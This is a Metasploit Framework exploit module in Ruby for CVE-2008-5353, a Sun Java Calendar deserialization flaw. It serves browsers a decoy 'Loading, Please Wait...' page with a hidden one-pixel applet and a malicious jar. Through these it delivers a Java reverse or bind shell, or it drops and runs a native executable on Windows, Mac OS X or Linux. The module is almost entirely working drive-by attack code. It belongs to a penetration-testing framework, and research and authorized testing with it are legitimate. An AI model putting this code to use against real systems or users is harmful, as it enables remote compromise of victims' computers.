##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize( info = {} )

		super( update_info( info,
			'Name'					=> 'Sun Java Calendar Deserialization Exploit',
			'Description'		=> %q{
				This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM.

				The payload can be either a native payload which is generated as an executable and
				dropped/executed on the target or a shell from within the Java applet in the target browser.

				The effected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16
				and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected).
			},
			'License'				=> MSF_LICENSE,
			'Author'				=> [ 'sf', 'hdm' ],
			'Version'       => '1',
			'References'		=>
			[
				[ 'CVE', '2008-5353' ],
				[ 'OSVDB', '50500'],
				[ 'URL', 'http://slightlyrandombrokenthoughts.blogspot.com/2008/12/calendar-bug.html' ],
				[ 'URL', 'http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html' ],
				[ 'URL', 'http://blog.cr0.org/2009/05/write-once-own-everyone.html' ],
				[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-244991-1' ]
			],
			'Platform'     => [ 'win', 'osx', 'linux', 'solaris' ],
			'Payload'      => { 'Space' => 2048, 'BadChars' => '', 'DisableNops' => true },
			'Targets'      =>
				[
					[ 'Generic (Java Payload)',
						{
							# This is a bad hack to force only the generic/shell_bind_tcp and generic/shell_reverse_tcp payloads
							'Platform' => ['win'],
							'Payload' => { 'Space' => 0 },
							'Arch' => ARCH_CMD,
						}
					],
					[ 'Windows x86 (Native Payload)',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Mac OS X PPC (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC,
						}
					],
					[ 'Mac OS X x86 (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Linux x86 (Native Payload)',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86,
						}
					],
				],
			'DefaultTarget'	=> 0
			))
	end


	def on_request_uri( cli, request )
		data = nil
		host = nil
		port = nil

		if not request.uri.match(/\.jar$/i)
			if not request.uri.match(/\/$/)
				send_redirect( cli, get_resource() + '/', '')
				return
			end

			print_status( "Handling request from #{cli.peerhost}:#{cli.peerport}..." )

			payload = regenerate_payload( cli )
			if not payload
				print_status( "Failed to generate the payload." )
				return
			end

			if target.name == 'Generic (Java Payload)'
				if datastore['LHOST']
					host = datastore['LHOST']
					port = datastore['LPORT']
					print_status( "Payload will be a Java reverse shell to #{host}:#{port} from #{cli.peerhost}..." )
				else
					port = datastore['LPORT']
					datastore['RHOST'] = cli.peerhost
					print_status( "Payload will be a Java bind shell on #{cli.peerhost}:#{port}..." )
				end
			else

				if target['Arch'] == ARCH_X86
					data = Msf::Util::EXE.to_win32pe( framework, payload.encoded ) if target['Platform'] == 'win'
					data = Msf::Util::EXE.to_osx_x86_macho( framework, payload.encoded ) if target['Platform'] == 'osx'
					data = Msf::Util::EXE.to_linux_x86_elf( framework, payload.encoded ) if target['Platform'] == 'linux'
				elsif target['Arch'] == ARCH_PPC
					data = Msf::Util::EXE.to_osx_ppc_macho( framework, payload.encoded ) if target['Platform'] == 'osx'
				end

				if data
					print_status( "Generated executable to drop (#{data.length} bytes)." )
					data = Rex::Text.to_hex( data, prefix="" )
				else
					print_status( "Failed to generate the executable." )
					return
				end

			end

			send_response_html( cli, generate_html( data, host, port ), { 'Content-Type' => 'text/html' } )
			return
		end

		print_status( "Sending Applet.jar to #{cli.peerhost}:#{cli.peerport}..." )
		send_response( cli, generate_jar(), { 'Content-Type' => "application/octet-stream" } )

		handler( cli )
	end

	def generate_html( data, host, port )
		html  = "<html><head><title>Loading, Please Wait...</title></head>"
		html += "<body><center><p>Loading, Please Wait...</p></center>"
		html += "<applet archive=\"Applet.jar\" code=\"msf.x.AppletX.class\" width=\"1\" height=\"1\">"
		html += "<param name=\"data\" value=\"#{data}\"/>" if data
		html += "<param name=\"lhost\" value=\"#{host}\"/>" if host
		html += "<param name=\"lport\" value=\"#{port}\"/>" if port
		html += "</applet></body></html>"
		return html
	end

	def generate_jar()
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2008-5353.jar" )
		fd = File.open( path, "rb" )
		data = fd.read(fd.stat.size)
		fd.close
		return data
	end

end